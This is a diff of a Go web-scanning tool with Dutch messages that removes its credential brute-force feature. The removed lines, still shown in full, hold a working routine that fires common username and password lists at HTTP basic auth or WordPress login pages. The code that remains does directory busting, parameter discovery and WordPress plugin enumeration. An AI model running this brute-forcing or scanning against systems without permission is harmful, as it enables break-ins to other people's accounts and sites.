@@ -13,21 +13,16 @@ import (
 	"time"
 )
 
-// Mapping of wordlists to their GitHub raw URLs from SecLists
-var wordlistMapping = map[string]string{
+// WordlistMapping stays as mapping of wordlists to their GitHub raw URLs from SecLists
+var WordlistMapping = map[string]string{
 	"common":     "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt",
 	"parameters": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt",
-	"passwords":  "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
-	"usernames":  "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt",
 	"wp_fuzz":    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt",
 }
 
-func getWordlist(o options, listType string) ([]string, error) {
-	if o.wordlist != "" {
-		return readLines(o.wordlist)
-	}
+func getWordlist(listType string) ([]string, error) {
 
-	url, ok := wordlistMapping[listType]
+	url, ok := WordlistMapping[listType]
 	if !ok {
 		return nil, fmt.Errorf("onbekende wordlist type: %s", listType)
 	}
@@ -48,16 +43,11 @@ func getWordlist(o options, listType string) ([]string, error) {
 
 	// Check if already downloaded
 	if _, err := os.Stat(localPath); err == nil {
-		if !o.jsonOut {
-			fmt.Printf("[*] Opgehaald: Lokale cache van %s\n", fileName)
-		}
 		return readLines(localPath)
 	}
 
 	// Download from GitHub
-	if !o.jsonOut {
-		fmt.Printf("[*] Wordlist niet lokaal gevonden. Downloadt %s (eenmalig)...\n", fileName)
-	}
+	fmt.Printf("[*] Wordlist niet lokaal gevonden. Downloadt %s (eenmalig)...\n", fileName)
 
 	resp, err := http.Get(url)
 	if err != nil {
@@ -128,7 +118,7 @@ func runVulnAnalysis(o options) {
 			fmt.Printf("\n[*] Start Directory & File Busting op %s...\n", domain)
 		}
 
-		words, err := getWordlist(o, "common")
+		words, err := getWordlist("common")
 		if err == nil {
 			runDirectoryBusting(client, domain, words, workers, o)
 		}
@@ -138,7 +128,7 @@ func runVulnAnalysis(o options) {
 		if !o.jsonOut {
 			fmt.Printf("\n[*] Start Parameter Discovery op %s...\n", domain)
 		}
-		words, err := getWordlist(o, "parameters")
+		words, err := getWordlist("parameters")
 		if err == nil {
 			runParameterDiscovery(client, domain, words, workers, o)
 		}
@@ -151,20 +141,8 @@ func runVulnAnalysis(o options) {
 		isWordPress = runCMSScan(client, domain, o)
 	}
 
-	if o.bruteCheck {
-		if !o.jsonOut {
-			fmt.Printf("\n[*] Start Credential Brute-Forcing op %s...\n", domain)
-		}
-		passwords, _ := getWordlist(o, "passwords")
-		usernames, _ := getWordlist(o, "usernames")
-
-		if len(passwords) > 0 {
-			runCredentialBruteForce(client, domain, usernames, passwords, workers, o)
-		}
-	}
-
 	if isWordPress || o.cmsCheck {
-		words, err := getWordlist(o, "wp_fuzz")
+		words, err := getWordlist("wp_fuzz")
 		if err != nil {
 			if !o.jsonOut {
 				fmt.Printf("[!] Sla WP Plugin Enumeration over: kon wordlist niet laden (%v)\n", err)
@@ -376,140 +354,6 @@ func runCMSScan(client *http.Client, domain string, o options) bool {
 		fmt.Println("[-] Geen bekende CMS inlogportalen gevonden.")
 	}
 	return foundWP
-}
-
-func runCredentialBruteForce(client *http.Client, domain string, usernames []string, passwords []string, workers int, o options) {
-	proto := getProtocol(client, domain)
-	if o.username != "" {
-		usernames = []string{o.username}
-	}
-
-	targetURL := fmt.Sprintf("%s%s/", proto, domain)
-	attackMode := "basic"
-
-	req, _ := http.NewRequest("GET", targetURL, nil)
-	res, err := client.Do(req)
-	if err == nil {
-		if res.StatusCode != 401 && res.StatusCode != 403 {
-			targetURL = fmt.Sprintf("%s%s/admin", proto, domain)
-			req, _ = http.NewRequest("GET", targetURL, nil)
-			res, _ = client.Do(req)
-		}
-		if res != nil {
-			if res.StatusCode == 401 || res.StatusCode == 403 {
-				attackMode = "basic"
-			} else {
-				wpURL := fmt.Sprintf("%s%s/wp-login.php", proto, domain)
-				req, _ = http.NewRequest("GET", wpURL, nil)
-				resWP, errWP := client.Do(req)
-				if errWP == nil && (resWP.StatusCode == 200 || resWP.StatusCode == 302) {
-					targetURL = wpURL
-					attackMode = "wp-form"
-					resWP.Body.Close()
-				}
-			}
-			res.Body.Close()
-		}
-	}
-
-	if !o.jsonOut {
-		fmt.Printf("[*] Mode: %s op %s (Users: %d, Passwords: %d)\n", attackMode, targetURL, len(usernames), len(passwords))
-	}
-
-	type cred struct{ u, p string }
-	creds := make(chan cred, workers*2)
-	results := make(chan string, 1)
-	var wg sync.WaitGroup
-	var stopFlag bool
-	var mu sync.Mutex
-
-	for i := 0; i < workers; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			for c := range creds {
-				mu.Lock()
-				if stopFlag {
-					mu.Unlock()
-					continue
-				}
-				mu.Unlock()
-
-				var r *http.Request
-				if attackMode == "basic" {
-					r, _ = http.NewRequest("GET", targetURL, nil)
-					r.SetBasicAuth(c.u, c.p)
-				} else {
-					form := fmt.Sprintf("log=%s&pwd=%s&wp-submit=Log+In", c.u, c.p)
-					r, _ = http.NewRequest("POST", targetURL, strings.NewReader(form))
-					r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-				}
-				r.Header.Set("User-Agent", "NetScope/4.0")
-				rs, err := client.Do(r)
-				if err != nil {
-					continue
-				}
-				success := false
-				if attackMode == "basic" {
-					if rs.StatusCode != 401 && rs.StatusCode != 403 {
-						success = true
-					}
-				} else {
-					if rs.StatusCode == 302 && strings.Contains(rs.Header.Get("Location"), "wp-admin") {
-						success = true
-					}
-				}
-				rs.Body.Close()
-
-				if success {
-					mu.Lock()
-					if !stopFlag {
-						stopFlag = true
-						successMsg := "\n🔥 [BOEM! INLOG GEVONDEN]\n"
-						successMsg += fmt.Sprintf("   - Gebruikersnaam: %s\n", c.u)
-						successMsg += fmt.Sprintf("   - Wachtwoord:    %s\n", c.p)
-						successMsg += fmt.Sprintf("   - Methode:       %s\n", attackMode)
-
-						if attackMode == "basic" {
-							successMsg += fmt.Sprintf("\n💡 [TIP]: Probeer dit op de website of via SSH: ssh %s@%s", c.u, domain)
-						} else {
-							successMsg += fmt.Sprintf("\n💡 [TIP]: Je kunt nu inloggen op het %s dashboard!", attackMode)
-						}
-						results <- successMsg
-					}
-					mu.Unlock()
-				}
-			}
-		}()
-	}
-
-	go func() {
-		for _, u := range usernames {
-			for _, p := range passwords {
-				mu.Lock()
-				if stopFlag {
-					mu.Unlock()
-					break
-				}
-				mu.Unlock()
-				creds <- cred{u, p}
-			}
-		}
-		close(creds)
-	}()
-
-	wg.Wait()
-	close(results)
-
-	hit := false
-	for r := range results {
-		fmt.Println(r)
-		hit = true
-	}
-	if !hit && !o.jsonOut {
-		fmt.Println("\n[-] Helaas! Geen werkende combinaties gevonden in deze lijst.")
-		fmt.Println("    Tip: Probeer een grotere wordlist met de '-w' flag.")
-	}
 }
 
 func runWPPluginFuzz(client *http.Client, domain string, words []string, workers int, o options) {
